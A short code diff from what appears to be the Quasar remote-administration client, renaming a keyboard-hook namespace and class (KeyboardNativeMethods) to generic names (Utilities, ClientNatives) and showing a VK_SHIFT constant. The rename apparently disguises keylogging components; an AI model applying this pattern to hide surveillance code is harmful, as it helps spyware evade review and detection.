@@ -2,9 +2,9 @@
 // Copyright (c) 2015 George Mamaladze
 // See license.txt or https://mit-license.org/
 
-namespace Quasar.Client.MouseKeyHook.WinApi
+namespace Quasar.Client.Utilities
 {
-    internal static partial class KeyboardNativeMethods
+    internal static partial class ClientNatives
     {
         //values from Winuser.h in Microsoft SDK.
         public const byte VK_SHIFT = 0x10;
